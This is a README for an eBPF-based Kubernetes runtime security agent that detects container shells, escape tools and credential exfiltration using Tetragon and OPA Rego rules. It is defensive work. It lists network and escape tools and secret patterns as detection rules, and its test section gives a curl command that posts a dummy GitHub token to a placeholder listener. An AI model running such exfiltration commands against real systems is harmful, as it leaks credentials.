# kratos

> eBPF-powered runtime security agent for Kubernetes.  
> Detects malicious processes and secret exfiltration — before a CVE exists.

```
kernel syscall → Tetragon eBPF → Go agent → OPA Rego rules → alert
```

---

## What it does

Kratos hooks into the Linux kernel via **Tetragon** and a custom eBPF C program, watching every process spawn and outbound network connection inside your Kubernetes cluster. Every event is evaluated against **OPA Rego policies** — human-readable rules that fire alerts without touching Go code.

Three detection layers:

**Process detection**
- Shell spawned inside a container (`/bin/bash`, `/bin/sh` inside nginx, node, python)
- Network tools (`curl`, `wget`, `nc`) executed by app processes
- Container escape attempts (`nsenter`, `unshare`, `chroot`)
- Severity-aware — production namespace shells fire `CRITICAL`, others fire `HIGH`

**Deep packet inspection**
- Custom eBPF kprobe on `tcp_sendmsg` reads raw TCP payload bytes from kernel memory
- Handles both `ITER_UBUF` (kernel 6.14+) and `ITER_IOVEC` iterator types
- GitHub PAT (`ghp_*`) detected in outbound payload — before it hits the wire
- AWS credentials (`AKIA*`, `ASIA*`) in network traffic
- Generic secret patterns (`"token":`, `Authorization: Bearer`) to suspicious destinations

**Rule-based via OPA Rego**
- Add new detection rules by dropping a `.rego` file — zero code changes, zero rebuild
- Rules are plain text, human-readable, auditable, version-controlled
- Hot-reload via `fsnotify` — policy updates picked up in 500ms without restarting

---

## Architecture

<img width="709" height="658" alt="image" src="https://github.com/user-attachments/assets/ab8cb641-5157-46d3-a317-d7b6f034e1de" />


---

## Demo

### Process detection — shell spawned in container

<img width="654" height="793" alt="image" src="https://github.com/user-attachments/assets/d5f8719b-5a4a-4648-b562-9dbe8011c2ca" />


The moment you `kubectl exec -it <pod> -- /bin/bash`, krato fires. Tetragon catches the `execve()` syscall at the kernel level and your Rego rule evaluates the event in real time.

### DPI — GitHub PAT exfiltration detected

<img width="519" height="447" alt="image" src="https://github.com/user-attachments/assets/6efdf468-086b-4551-b3d7-f6ab92b753ea" />

Your custom eBPF C program reads the raw HTTP payload from kernel memory — `token=ghp_1234567890...` — before it leaves the machine. Caught at PID level, process name, and full payload.

---

## How deep packet inspection works

### Plaintext HTTP — tcp_sendmsg kprobe

Krato hooks `tcp_sendmsg` via a custom eBPF C program compiled with clang. When any process sends data over TCP, the kprobe fires and reads the payload from the `msghdr` iterator.

Key implementation detail — kernel 6.14+ uses `ITER_UBUF` instead of `ITER_IOVEC` for most send calls. The kprobe handles both:

```c
if (iter_type == ITER_IOVEC) {
    iov_ptr = BPF_CORE_READ(msg, msg_iter.__iov);
    src = iov.iov_base + iov_offset;
} else if (iter_type == ITER_UBUF) {
    ubuf = BPF_CORE_READ(msg, msg_iter.ubuf);
    src = ubuf + iov_offset;
}
```

Events are submitted to a ring buffer and read by the Go agent in real time.

### Encrypted HTTPS — SSL uprobe (planned)

For TLS traffic, attach a uprobe to `SSL_write` in `libssl.so`. This function is called with plaintext data *before* encryption — same pattern matching, zero decryption needed. This is the technique used by Pixie and Hubble in production.

---

## Why OPA Rego

Hardcoded detection logic means every new rule requires a code change, rebuild, and redeploy.

With Rego, adding a detection rule is five lines:

```rego
deny[msg] {
    input.process.binary == "/usr/bin/nmap"
    input.container.pod_name != ""
    msg := sprintf("Port scanner in pod [%s]", [input.container.pod_name])
}
```

Drop the file. Agent picks it up in 500ms. No rebuild, no restart.

Security teams can write and audit rules without touching Go. Rules are version-controlled, diff-able, and reviewable like any other code.

---

## Tech stack

| Layer | Technology |
|-------|-----------|
| eBPF runtime | Tetragon by Cilium + custom `dpi.c` |
| Agent language | Go 1.22 |
| Policy engine | OPA + Rego |
| Hot-reload | fsnotify (500ms debounce) |
| Cluster | Kubernetes (Kind for local dev) |
| Package manager | Helm |

---

## Setup

**Prerequisites:** Linux (kernel 5.8+ with BTF), Docker, Go 1.22+, kubectl, Helm, Kind, clang

```bash
# 1. Create Kind cluster
kind create cluster --name ebpf-agent

# 2. Install Tetragon
helm repo add cilium https://helm.cilium.io
helm repo update
helm install tetragon cilium/tetragon -n kube-system
kubectl rollout status daemonset/tetragon -n kube-system

# 3. Clone the repo
git clone https://github.com/karandesai2005/krato
cd krato

# 4. Compile the eBPF DPI program
chmod +x scripts/build-ebpf.sh
./scripts/build-ebpf.sh

# 5. Port-forward Tetragon gRPC
kubectl port-forward -n kube-system pod/<tetragon-pod> 54321:54321

# 6. Run the agent (needs root for kprobe attach)
go mod tidy
sudo KUBECONFIG=$HOME/.kube/config go run ./cmd/agent/main.go
```

### Testing

```bash
# Trigger process alert — shell in container
kubectl run test-nginx --image=nginx --restart=Never
kubectl exec -it test-nginx -- /bin/bash

# Trigger DPI alert — GitHub PAT exfiltration
kubectl exec -it test-nginx -- curl -X POST http://<listener-ip>:8080 \
  -d 'token=ghp_1234567890abcdefghijklmnopqrstuvwxyz'

# Test hot-reload — edit any .rego file while agent is running
echo "# new rule" >> policies/process.rego
# Agent prints: 🔄 policies reloaded — 2 rules active
```

---

## Project structure

```
krato/
├── cmd/agent/
│   └── main.go                 ← entry point, orchestrates all components
├── ebpf/
│   ├── dpi.c                   ← custom eBPF kprobe for tcp_sendmsg DPI
│   └── vmlinux.h               ← kernel BTF type definitions
├── internal/
│   ├── tetragon/
│   │   └── listener.go         ← Tetragon gRPC event stream + OPA router
│   ├── opa/
│   │   └── engine.go           ← loads .rego files, hot-reload, Violation types
│   └── dpi/
│       └── monitor.go          ← loads dpi_bpf.o, reads ring buffer, PAT filter
├── policies/
│   ├── process.rego            ← malicious process rules with severity tiers
│   └── network.rego            ← DPI + secret exfiltration rules
├── k8s/
│   ├── kind-config.yaml        ← Kind cluster config
│   ├── tetragon-policy.yaml    ← Tetragon TracingPolicy CRD
│   └── tetragon-network-policy.yaml ← Network DPI TracingPolicy
└── scripts/
    └── build-ebpf.sh           ← compiles dpi.c → internal/dpi/dpi_bpf.o
```

---

## Detection rules

### process.rego

| Rule | Trigger | Severity |
|------|---------|----------|
| Shell in production | `/bin/bash` etc in `production` namespace | CRITICAL |
| Shell in container | `/bin/bash` etc in any other pod | HIGH |
| Network tool from app | `curl`/`wget`/`nc` by `nginx`, `node`, `python` | HIGH |
| Container escape | `nsenter`, `unshare` | CRITICAL |

### network.rego

| Rule | Trigger | Severity |
|------|---------|----------|
| GitHub PAT exfiltration | `ghp_*` in payload to non-GitHub IP | CRITICAL |
| GitHub PAT anywhere | `ghp_*` in any outbound payload | HIGH |
| AWS credential leak | `AKIA*`/`ASIA*` in outbound traffic | CRITICAL |
| Bearer token | `Authorization: Bearer` to suspicious IPs | MEDIUM |

---

## What I'd build next

- SSL uprobe for HTTPS payload inspection via `SSL_write` in libssl
- Threat intel feed integration — pull known bad IPs from OTX/MISP into Rego
- Slack / PagerDuty alerting webhooks
- Web dashboard with real-time alert feed and severity timeline

---

## References

- [Tetragon Documentation](https://tetragon.io/docs/)
- [OPA Rego Language Reference](https://www.openpolicyagent.org/docs/latest/policy-language/)
- [eBPF.io](https://ebpf.io)
- [Cilium TracingPolicy](https://tetragon.io/docs/concepts/tracing-policy/)
- [Medium writeup — how I built this](https://medium.com/@karanishudesai2/i-built-an-ebpf-security-agent-that-catches-github-pat-exfiltration-at-the-kernel-level-99e36470f7b0)

---

*Author: [Karan Desai](https://karan-desai.vercel.app)*
